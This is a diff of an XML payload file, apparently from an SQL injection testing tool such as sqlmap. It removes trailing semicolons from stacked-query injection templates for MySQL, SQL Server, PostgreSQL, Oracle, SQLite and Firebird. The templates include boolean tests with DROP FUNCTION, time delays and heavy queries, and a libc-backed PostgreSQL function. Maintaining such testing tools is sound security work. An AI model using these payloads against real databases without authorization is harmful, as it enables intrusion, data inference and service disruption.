@@ -1072,13 +1072,13 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; IF(([INFERENCE]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR]);</vector>
+        <vector>; IF(([INFERENCE]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR])</vector>
         <request>
-            <payload>; IF(([RANDNUM]=[RANDNUM]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR]);</payload>
+            <payload>; IF(([RANDNUM]=[RANDNUM]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR])</payload>
             <comment>#</comment>
         </request>
         <response>
-            <comparison>; IF(([RANDNUM]=[RANDNUM1]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR]);</comparison>
+            <comparison>; IF(([RANDNUM]=[RANDNUM1]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR])</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -1092,13 +1092,13 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</vector>
+        <vector>; IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</vector>
         <request>
-            <payload>; IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</payload>
+            <payload>; IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</payload>
             <comment>--</comment>
         </request>
         <response>
-            <comparison>; IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR];</comparison>
+            <comparison>; IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -1114,13 +1114,13 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>2</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</vector>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</vector>
         <request>
-            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</payload>
+            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</payload>
             <comment>--</comment>
         </request>
         <response>
-            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</comparison>
+            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</comparison>
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
@@ -1969,9 +1969,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]);</vector>
+        <vector>; IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
         <request>
-            <payload>; SELECT SLEEP([SLEEPTIME]);</payload>
+            <payload>; SELECT SLEEP([SLEEPTIME])</payload>
             <comment>-- </comment>
         </request>
         <response>
@@ -1990,9 +1990,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM]);</vector>
+        <vector>; IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
         <request>
-            <payload>; SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'));</payload>
+            <payload>; SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
             <comment>-- </comment>
         </request>
         <response>
@@ -2010,9 +2010,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END);</vector>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>; SELECT PG_SLEEP([SLEEPTIME]);</payload>
+            <payload>; SELECT PG_SLEEP([SLEEPTIME])</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2031,9 +2031,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END);</vector>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>; SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000);</payload>
+            <payload>; SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2051,9 +2051,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END);</vector>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>; CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME]);</payload>
+            <payload>; CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2073,9 +2073,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]';</vector>
+        <vector>; IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
         <request>
-            <payload>; WAITFOR DELAY '0:0:[SLEEPTIME]';</payload>
+            <payload>; WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2095,9 +2095,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL;</vector>
+        <vector>; SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL</vector>
         <request>
-            <payload>; SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL;</payload>
+            <payload>; SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2115,9 +2115,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL;</vector>
+        <vector>; SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL</vector>
         <request>
-            <payload>; SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5;</payload>
+            <payload>; SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2135,9 +2135,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;</vector>
+        <vector>; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END</vector>
         <request>
-            <payload>; BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;</payload>
+            <payload>; BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2155,9 +2155,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END;</vector>
+        <vector>; BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END</vector>
         <request>
-            <payload>; BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END;</payload>
+            <payload>; BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2175,9 +2175,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END);</vector>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))));</payload>
+            <payload>; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]0000000))))</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2196,9 +2196,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM]) FROM RDB$DATABASE;</vector>
+        <vector>; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3),[RANDNUM]) FROM RDB$DATABASE</vector>
         <request>
-            <payload>; SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3;</payload>
+            <payload>; SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3</payload>
             <comment>--</comment>
         </request>
         <response>
